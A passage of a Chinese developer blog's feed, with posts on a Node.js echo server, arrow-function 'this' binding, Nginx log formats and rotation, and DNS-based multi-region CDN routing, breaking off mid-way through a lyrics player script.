function_">log</span>(<span class="string">`客户端断开：<span class="subst">${socket.remoteAddress}</span>:<span class="subst">${socket.remotePort}</span>`</span>);</span><br><span class="line">    });</span><br><span class="line"></span><br><span class="line">    socket.<span class="title function_">on</span>(<span class="string">&#x27;end&#x27;</span>, <span class="function">() =&gt;</span> {</span><br><span class="line">        <span class="comment">// 客户端断开FIN</span></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;FIN&#x27;</span>);</span><br><span class="line">    });</span><br><span class="line">});</span><br><span class="line"></span><br><span class="line">server.<span class="title function_">on</span>(<span class="string">&#x27;error&#x27;</span>, <span class="function">(<span class="params">err</span>) =&gt;</span> {</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">`服务器错误：<span class="subst">${err.name}</span>\n<span class="subst">${err.stack}</span>`</span>);</span><br><span class="line">});</span><br><span class="line"></span><br><span class="line">server.<span class="title function_">on</span>(<span class="string">&#x27;close&#x27;</span>, <span class="function">() =&gt;</span> {</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;服务停止&#x27;</span>);</span><br><span class="line">});</span><br><span class="line"></span><br><span class="line">server.<span class="title function_">on</span>(<span class="string">&#x27;listening&#x27;</span>, <span class="function">() =&gt;</span> {</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Server listen on <span class="subst">${HOST}</span>:<span class="subst">${PORT}</span>`</span>);</span><br><span class="line">});</span><br><span class="line"></span><br><span class="line">server.<span class="title function_">listen</span>(<span class="variable constant_">PORT</span>, <span class="variable constant_">HOST</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">setInterval</span>(<span class="function">() =&gt;</span> {</span><br><span class="line">    server.<span class="title function_">getConnections</span>(<span class="function">(<span class="params">err, connections</span>) =&gt;</span> {</span><br><span class="line">        <span class="keyword">if</span> (!err) {</span><br><span class="line">            <span class="keyword">const</span> now = (<span class="keyword">new</span> <span class="title class_">Date</span>()).<span class="title function_">toUTCString</span>();</span><br><span class="line">            <span class="keyword">const</span> memoryUsage = <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(process.<span class="title function_">memoryUsage</span>());</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`[<span class="subst">${now}</span>] 连接数为：<span class="subst">${connections}</span>，最大连接数为：<span class="subst">${server.maxConnections}</span>，内存使用：<span class="subst">${memoryUsage}</span>`</span>);</span><br><span class="line">        }</span><br><span class="line">    });</span><br><span class="line">}, <span class="number">2000</span>);</span><br><span class="line"></span><br><span class="line">process.<span class="title function_">on</span>(<span class="string">&#x27;uncaughtException&#x27;</span>, <span class="function">(<span class="params">err</span>) =&gt;</span> {</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">`uncaughtException：<span class="subst">${err.name}</span>\n<span class="subst">${err.stack}</span>`</span>);</span><br><span class="line">    process.<span class="title function_">exit</span>(<span class="number">1</span>);</span><br><span class="line">});</span><br></pre></td></tr></table></figure><p>启动服务：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ulimit -n 10240</span><br><span class="line">nohup node echo.js &gt;/var/log/echo.log 2&gt;&amp;1 &amp; </span><br></pre></td></tr></table></figure><p>测试一下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">telnet echo.kekek.cc 7000</span><br></pre></td></tr></table></figure><p><a href="https://github.com/tianyk/echo.git">Github</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ES6箭头函数中的this</title>
      <link href="/post/arrow-this.html"/>
      <url>/post/arrow-this.html</url>
      
        <content type="html"><![CDATA[<h2 id="ES6箭头函数中的this"><a href="#ES6箭头函数中的this" class="headerlink" title="ES6箭头函数中的this"></a>ES6箭头函数中的this</h2><p>ES6 开始引入了箭头函数，让代码看起来更简洁了。但是箭头函数传统函数不仅仅是写法上的不同，在<code>this</code>和<code>arguments</code>的处理方式也有着很大的区别。</p><h3 id="this是局部的"><a href="#this是局部的" class="headerlink" title="this是局部的"></a>this是局部的</h3><p>在箭头函数中<code>this</code>是<strong>局部的</strong>，它跟其它局部变量的常规处理是一致的。看下面的例子：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">outer</span> (<span class="params">age</span>) &#123;</span><br><span class="line">    (<span class="function">() =&gt;</span> &#123;</span><br><span class="line">        (<span class="function">() =&gt;</span> &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">name</span>, age);</span><br><span class="line">        &#125;)();</span><br><span class="line">    &#125;)();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">outer.<span class="title function_">bind</span>(&#123;<span class="attr">name</span>: <span class="string">&#x27;小明&#x27;</span>&#125;)(<span class="number">10</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// =&gt; 小明 10</span></span><br></pre></td></tr></table></figure><p>这例子中我们函数共有三层嵌套，里面是两层箭头函数，这里我们在最里层箭头函数内部引用了<code>this</code>和一个局部变量<code>age</code>。对局局部变量<code>age</code>的查找规则我们很清楚，先在当前作用域查找，如果没有就去父作用域查找，一直到最顶层（window、global）。在箭头函数中对<code>this</code>的查找规则和<code>age</code>是一样的，箭头函数本身并没有一个自己的<code>this</code>，它要一直往上层找，直到找到<code>this</code>为止。</p><p>同样，对于<code>arguments</code>的处理也是一样的。需要注意的一点是箭头函数本身是没有<code>arguments</code>变量的。</p><h3 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h3><p>箭头函数虽然写起来更加简单，但是我们不能不加区分的在任何地方都用箭头函数替代传统函数，特别是在函数内部涉及<code>this</code>绑定时。看下面的例子：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">sayName</span>(<span class="params">fn</span>) &#123;</span><br><span class="line">    fn.<span class="title function_">bind</span>(&#123; <span class="attr">name</span>: <span class="string">&#x27;小明&#x27;</span> &#125;)();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">sayName</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123; <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;My name is&#x27;</span>, <span class="variable language_">this</span>.<span class="property">name</span>); &#125;);</span><br><span class="line"><span class="comment">// =&gt; My name is 小明</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 错误写法</span></span><br><span class="line"><span class="title function_">sayName</span>(<span class="function">() =&gt;</span> <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;My name is&#x27;</span>, <span class="variable language_">this</span>.<span class="property">name</span>));</span><br><span class="line"><span class="comment">// =&gt; My name is </span></span><br></pre></td></tr></table></figure><p>也正是这个原因<a href="https://github.com/koajs/koa/tree/v1.x">Koa 1.x</a>中我们可以中间件中使用<code>this</code>引用到<code>context</code>，而在<a href="https://github.com/koajs/koa/tree/2.0.0">Koa 2.x</a>中需要将<code>context</code>作为参数传到中间件内部。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// koa1.x</span></span><br><span class="line">app.<span class="title function_">use</span>(<span class="keyword">function</span> *(next) &#123;</span><br><span class="line">    <span class="keyword">var</span> start = <span class="keyword">new</span> <span class="title class_">Date</span>;</span><br><span class="line">    <span class="keyword">yield</span> next;</span><br><span class="line">    <span class="keyword">var</span> ms = <span class="keyword">new</span> <span class="title class_">Date</span> - start;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;%s %s - %s&#x27;</span>, <span class="variable language_">this</span>.<span class="property">method</span>, <span class="variable language_">this</span>.<span class="property">url</span>, ms);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// koa 2.x</span></span><br><span class="line">app.<span class="title function_">use</span>(<span class="title function_">async</span> (ctx, next) =&gt; &#123;</span><br><span class="line">    <span class="keyword">const</span> start = <span class="title class_">Date</span>.<span class="title function_">now</span>();</span><br><span class="line">    <span class="keyword">await</span> <span class="title function_">next</span>();</span><br><span class="line">    <span class="keyword">const</span> ms = <span class="title class_">Date</span>.<span class="title function_">now</span>() - start;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`<span class="subst">$&#123;ctx.method&#125;</span> <span class="subst">$&#123;ctx.url&#125;</span> - <span class="subst">$&#123;ms&#125;</span>ms`</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul><li><a href="https://www.cnblogs.com/vajoy/p/4902935.html">ES6 箭头函数中的 this？你可能想多了</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> es6 </tag>
            
            <tag> arrow-function </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Nginx日志配置与切割</title>
      <link href="/post/nginx-log.html"/>
      <url>/post/nginx-log.html</url>
      
        <content type="html"><![CDATA[<h2 id="Nginx日志配置与切割"><a href="#Nginx日志配置与切割" class="headerlink" title="Nginx日志配置与切割"></a>Nginx日志配置与切割</h2><p>Nginx 日志配置非常简单，首先使用<code>log_format</code>指令配置一个格式。然后使用 <code>access_log</code>（访问日志）、<code>error_log</code>（错误日志）指令开启即可。</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">http</span> &#123;</span><br><span class="line">    <span class="comment"># 日志格式 第二个参数是格式名字，可以配置多个format（这里的日志格式名为 `main`）。后面 access_log 指令使用哪个格式就写这个格式的名字。</span></span><br><span class="line">    <span class="attribute">log_format</span> main <span class="string">&#x27;<span class="variable">$remote_addr</span> - <span class="variable">$remote_user</span> [<span class="variable">$time_local</span>] &#x27;</span></span><br><span class="line">                       <span class="string">&#x27;&quot;<span class="variable">$request</span>&quot; <span class="variable">$status</span> <span class="variable">$bytes_sent</span> &#x27;</span></span><br><span class="line">                       <span class="string">&#x27;&quot;<span class="variable">$http_referer</span>&quot; &quot;<span class="variable">$http_user_agent</span>&quot;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="attribute">access_log</span> /var/log/nginx/access.log main;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 或者每个虚拟主机配置单独的日志文件夹</span></span><br><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">    <span class="attribute">access_log</span> /var/log/nginx/<span class="variable">$host</span>/access.log main;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="条件日志"><a href="#条件日志" class="headerlink" title="条件日志"></a>条件日志</h3><p>我们有一个心跳检测的服务，定期会向服务器发请求。这个请求每天会发很多次，这个请求的日志也是非常多的。这个日志没什么意义，可以把它忽略掉。</p><p>第一种方法就是配置一个location匹配到这个心跳检测接口将日志关掉。</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">location</span> = /_heartbeat &#123;</span><br><span class="line">    <span class="attribute">access_log</span> <span class="literal">off</span>;</span><br><span class="line">    <span class="attribute">proxy_pass</span> http://myserver;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面方法不是很灵活，我们要重复配置。有没有办法只配置一处就能做到呢？查看Nginx文档，发现有一个条件日志配置示例：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">http</span> &#123;</span><br><span class="line">    <span class="attribute">map</span> <span class="variable">$uri</span> <span class="variable">$loggable</span> &#123;</span><br><span class="line">        <span class="comment"># 可以使用正则</span></span><br><span class="line">        ~\.(jpg|png|gif|webp)$   0; <span class="comment"># 不记录图片</span></span><br><span class="line">        /<span class="attribute">_heartbeat</span>              <span class="number">0</span>; <span class="comment"># 不记录心跳检测</span></span><br><span class="line">        <span class="attribute">default</span>                  <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="attribute">access_log</span> /var/log/nginx/access.log main if=<span class="variable">$loggable</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="日志切割"><a href="#日志切割" class="headerlink" title="日志切割"></a>日志切割</h3><p>当 Nginx 接收到 <code>USR1</code> 时会重新打开日志文件。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mv /var/log/nginx/access.log /var/log/nginx/access.log-20180706</span><br><span class="line">kill -USR1 `cat /var/run/nginx.pid`</span><br></pre></td></tr></table></figure><p>上面方案很不灵活，需要手动处理。我们可以使用crontab或者<a href="https://github.com/logrotate/logrotate">logrotate</a>来做到自动化。</p><ol><li><p>crontab </p> <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">0 0 * * * 每天零点执行</span></span><br><span class="line"></span><br><span class="line">LOG_PATH=/var/log/nginx</span><br><span class="line">DATE=`date -d &quot;yesterday&quot; +%Y%m%d`</span><br><span class="line">PID=`cat /var/run/nginx.pid`</span><br><span class="line"></span><br><span class="line">cd $LOG_PATH</span><br><span class="line"></span><br><span class="line">mv access.log access.log-$DATE &amp;&amp; zip -mq access.log-$DATE.zip access.log-$DATE</span><br><span class="line">kill -USR1 $PID</span><br></pre></td></tr></table></figure></li><li><p>logrotate</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">/var/log/nginx/*.log &#123;</span><br><span class="line">    daily</span><br><span class="line">    dateext</span><br><span class="line">    rotate 30</span><br><span class="line">    compress</span><br><span class="line">    delaycompress</span><br><span class="line">    notifempty</span><br><span class="line">    sharedscripts</span><br><span class="line">    postrotate</span><br><span class="line">        if [ -f /var/run/nginx.pid ]; then</span><br><span class="line">            kill -USR1 `cat /var/run/nginx.pid`</span><br><span class="line">        fi</span><br><span class="line">    endscript</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><ul><li>第一行要处理的日志，可以使用通配符。后面<code>{}</code>包裹日志切割的配置项。</li><li>daily：表示每天执行一次，类似的配置还有weekly,monthly每周和每月。</li><li>dateext：文件后缀使用日期命名。</li><li>rotate 30：保留最近30天的日志。</li><li>compress：对日志进行压缩。</li><li>delaycompress：延迟压缩，分割完成后延迟一天压缩此日志。</li><li>notifempty：忽略空日志。</li><li>sharedscripts：执行脚本。</li><li>postrotate：日志被切割后执行的脚本，对应的<code>prerotate</code>表示在切割前执行的脚本。</li><li>endscript：标记脚本结束。</li><li>测试一下脚本：<code>logrotate -d /etc/logrotate.d/nginx</code>。</li><li>执行后面的命令能立即看到效果：<code>logrotate -vf /etc/logrotate.d/nginx</code>。</li></ul></blockquote></li></ol><h3 id="输出JSON格式的日志"><a href="#输出JSON格式的日志" class="headerlink" title="输出JSON格式的日志"></a>输出JSON格式的日志</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">log_format json escape=json &#x27;&#123;&#x27;</span><br><span class="line">    &#x27;&quot;remote_addr&quot;: &quot;$remote_addr&quot;,&#x27;</span><br><span class="line">    &#x27;&quot;x_forwarded_for&quot;:  &quot;$http_x_forwarded_for&quot;,&#x27;</span><br><span class="line">    &#x27;&quot;time_iso8601&quot;: &quot;$time_iso8601&quot;,&#x27;</span><br><span class="line">    &#x27;&quot;host&quot;: &quot;$host&quot;,&#x27;</span><br><span class="line">    &#x27;&quot;method&quot;: &quot;$request_method&quot;,&#x27;</span><br><span class="line">    &#x27;&quot;request_uri&quot;: &quot;$request_uri&quot;,&#x27;</span><br><span class="line">    &#x27;&quot;status&quot;: $status,&#x27;</span><br><span class="line">    &#x27;&quot;http_referer&quot;:  &quot;$http_referer&quot;,&#x27;</span><br><span class="line">    &#x27;&quot;body_bytes_sent&quot;: &quot;$body_bytes_sent&quot;,&#x27;</span><br><span class="line">    &#x27;&quot;http_user_agent&quot;: &quot;$http_user_agent&quot;,&#x27;</span><br><span class="line">    &#x27;&quot;request_time&quot;: &quot;$request_time&quot;,&#x27;</span><br><span class="line">    &#x27;&quot;upstream_addr&quot;: &quot;$upstream_addr&quot;,&#x27;</span><br><span class="line">    &#x27;&quot;upstream_response_time&quot;: &quot;$upstream_response_time&quot;,&#x27;</span><br><span class="line">    &#x27;&quot;x_request_id&quot;: &quot;$upstream_http_x_request_id&quot;,&#x27;</span><br><span class="line">    &#x27;&quot;x_response_time&quot;: &quot;$upstream_http_x_response_time&quot;&#x27;</span><br><span class="line">&#x27;&#125;&#x27;;</span><br></pre></td></tr></table></figure><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul><li><a href="http://nginx.org/en/docs/http/ngx_http_log_module.html">Module ngx_http_log_module</a></li><li><a href="https://linux.cn/article-8227-1.html">配置 logrotate 的终极指导</a></li><li><a href="http://nginx.org/en/docs/http/ngx_http_log_module.html#log_format">log_format</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> nginx </category>
          
      </categories>
      
      
        <tags>
            
            <tag> nginx </tag>
            
            <tag> log </tag>
            
            <tag> logrotate </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>部署全球CDN网络</title>
      <link href="/post/global-cdn.html"/>
      <url>/post/global-cdn.html</url>
      
        <content type="html"><![CDATA[<h2 id="部署全球CDN网络"><a href="#部署全球CDN网络" class="headerlink" title="部署全球CDN网络"></a>部署全球CDN网络</h2><p>我们现在除了大陆的还有美国及东南亚的用户，在国内可以使用<a href="https://www.aliyun.com/product/cdn">阿里</a>或者<a href="https://cloud.tencent.com/product/cdn">腾讯</a>的CDN服务。但是上面两家在国外的节点不是很多，而国外厂商有<a href="https://aws.amazon.com/cloudfront/">Amazon CloudFront</a>和<a href="https://www.cloudflare.com/">Cloudflare</a>在大陆地区的服务又不好。那有没有办法让一个域名大陆用户使用阿里的服务，国外的用户是用CloudFront服务呢？</p><p>答案是有的，我们知道现在主流的CDN都是采用CNAME的形式配置DNS。CNAME的核心就是智能DNS，那我们如果搭建一个DNS让它给国内外用户返回不同的CNAME不就解决了吗，也就是CDN的DNS。所幸，不用我们麻烦自己去搭建这个智能DNS，现在像阿里的云DNS和DNSPod都提供了比我们需求更强大的功能。下面是具体网络拓扑图：</p><p><img src="/images/global-dns.png" alt="暂缺"></p><h3 id="具体操作"><a href="#具体操作" class="headerlink" title="具体操作"></a>具体操作</h3><blockquote><p>由于暂时没有Amazon CloudFront和Cloudflare账号，国外CDN我就用腾讯CDN模拟了。实际操作时将腾讯CDN换成Amazon CloudFront或Cloudflare即可。</p></blockquote><ol><li><p>首先分别在阿里CDN和腾讯CDN开启服务</p><p> 阿里CDN：s.kekek.cc.w.kunlunar.com.<br> <img src="/images/cdn-cn-kekek.png" alt="阿里CDN"></p><p> 腾讯CDN：s.kekek.cc.cdn.dnsv1.com.<br> <img src="/images/cdn-world-kekek.png" alt="腾讯CDN"></p></li><li><p>为域名配置智能DNS</p><p> 境外服务配置为腾讯DNS的CNAME，默认线路（境内）配置为阿里CDN的CNANME。<br> <img src="/images/dns-kekek.png"></p></li></ol><p>下面我们测试一下线路：</p><ol><li>114dns</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">$ dig @114.114.114.114 s.kekek.cc CNAME</span><br><span class="line"></span><br><span class="line">; &lt;&lt;&gt;&gt; DiG 9.10.6 &lt;&lt;&gt;&gt; @114.114.114.114 s.kekek.cc CNAME</span><br><span class="line">; (1 server found)</span><br><span class="line">;; global options: +cmd</span><br><span class="line">;; Got answer:</span><br><span class="line">;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 41126</span><br><span class="line">;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 0</span><br><span class="line"></span><br><span class="line">;; QUESTION SECTION:</span><br><span class="line">;s.kekek.cc.INCNAME</span><br><span class="line"></span><br><span class="line">;; ANSWER SECTION:</span><br><span class="line">s.kekek.cc.600INCNAMEs.kekek.cc.w.kunlunar.com.</span><br><span class="line"></span><br><span class="line">;; Query time: 2735 msec</span><br><span class="line">;; SERVER: 114.114.114.114#53(114.114.114.114)</span><br><span class="line">;; WHEN: Wed Jul 04 23:28:47 CST 2018</span><br><span class="line">;; MSG SIZE  rcvd: 67</span><br></pre></td></tr></table></figure><ol start="2"><li><p>Cloudflare DNS</p><blockquote><p>使用 1.1.1.1 DNS相当于模拟用户在境外进行DNS查询。</p></blockquote> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">$ dig @1.1.1.1 s.kekek.cc CNAME</span><br><span class="line"></span><br><span class="line">; &lt;&lt;&gt;&gt; DiG 9.10.6 &lt;&lt;&gt;&gt; @1.1.1.1 s.kekek.cc CNAME</span><br><span class="line">; (1 server found)</span><br><span class="line">;; global options: +cmd</span><br><span class="line">;; Got answer:</span><br><span class="line">;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 5551</span><br><span class="line">;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1</span><br><span class="line"></span><br><span class="line">;; OPT PSEUDOSECTION:</span><br><span class="line">; EDNS: version: 0, flags:; udp: 1452</span><br><span class="line">;; QUESTION SECTION:</span><br><span class="line">;s.kekek.cc.INCNAME</span><br><span class="line"></span><br><span class="line">;; ANSWER SECTION:</span><br><span class="line">s.kekek.cc.345INCNAMEs.kekek.cc.cdn.dnsv1.com.</span><br><span class="line"></span><br><span class="line">;; Query time: 320 msec</span><br><span class="line">;; SERVER: 1.1.1.1#53(1.1.1.1)</span><br><span class="line">;; WHEN: Wed Jul 04 23:27:39 CST 2018</span><br><span class="line">;; MSG SIZE  rcvd: 77</span><br></pre></td></tr></table></figure></li></ol><p>可以看到我们我们使用114DNS时，返回的CNAME为<code>s.kekek.cc.w.kunlunar.com.</code>，对应的就是我们配置的阿里CDN。使用Cloudflare DNS是模拟海外用户得到的CNAME是<code>s.kekek.cc.cdn.dnsv1.com.</code>，这个刚好是我们腾讯的CDN。</p><p>现在我们境内用户访问<a href="http://ss.kekek.cc/">s.kekek.cc</a>时就可以使用阿里的CDN提供加速了，境外用户访问时就可以由腾讯CDN提供加速服务了。</p><h3 id="国内外源站问题"><a href="#国内外源站问题" class="headerlink" title="国内外源站问题"></a>国内外源站问题</h3><p>对于国内外是否是用同一个源站，两者都可。可以根据实际情况去测试哪种更符合自身业务，从洛杉矶到上海的最小延迟在<code>180ms</code>左右，也就是说境外用户访问首次加载的新资源时会出现比较严重的延迟。如果对首次加载延迟太在意可以使用一个源站，如果<strong>频繁</strong>回源可考虑境内境外使用不同的源站。</p><p>使用不同源站时可以采用主动文件同步、<a href="nginx-proxy-cache.html">Nginx代理缓存</a>等方案同步两个源站资源。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>LRC播放器</title>
      <link href="/post/lrc-player.html"/>
      <url>/post/lrc-player.html</url>
      
        <content type="html"><![CDATA[<h2 id="LRC播放器"><a href="#LRC播放器" class="headerlink" title="LRC播放器"></a>LRC播放器</h2><iframe scrolling="no" width="100%" height="300" src="https://jsfiddle.net/ac35otdk/embedded/result,html,js,css/light/" frameborder="0" loading="lazy" allowfullscreen="allowfullscreen"></iframe><figure class="highlight js"><figcaption><span>lrc_player.js</span><a href="/downloads/code/lrc_player.js">view raw</a></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">toSecond</span>(<span class="params">time</span>) {</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Date</span>(<span class="string">`1970-01-01T<span class="subst">${time}</span>Z`</span>).<span class="title function_">getTime</span>() / <span class="number">1000</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 播放歌词</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>  {<span class="type"> </span></span></span><br><span class="line"><span class="type"><span class="comment"> *              lyrics, 歌词，格式为二维数组。e.g. [ [&#x27;00:00:00.40&#x27;, &#x27;周杰伦 - 等你下课 (with 杨瑞代)&#x27;], [&#x27;00:00:03.94&#x27;, &#x27;词：周杰伦&#x27;], [&#x27;00:00:05.21&#x27;, &#x27;曲：周杰伦&#x27;] ]</span></span></span><br><span class="line"><span class="type"><span class="comment"> *              seek  = &#x27;00:00:00&#x27;, 开始时间</span></span></span><br><span class="line"><span class="type"><span class="comment"> *              print = (lyric) =&gt; console.log(lyric), 歌词回调</span></span></span><br><span class="line"><span class="type"><span class="comment"> *              interval = 50 刷新检测间隔 ms</span></span></span><br><span class="line"><span class="type"><span class="comment"> *          </span>}</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@returns</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">play</span>(<span class="params">{ lyrics, seek = <span class="string">&#x27;00:00:00&#x27;</span>, print = (lyric) =&gt; <span class="variable language_">console</span>.log(lyric), interval = <span class="number">50</span> }</span>) {</span><br><span class="line">    seek = <span class="title function_">toSecond</span>(seek);</span><br><span class="line">    lyrics = lyrics.<span class="title function_">map</span>(<span class="function"><span class="params">lyric</span> =&gt;</span> [<span 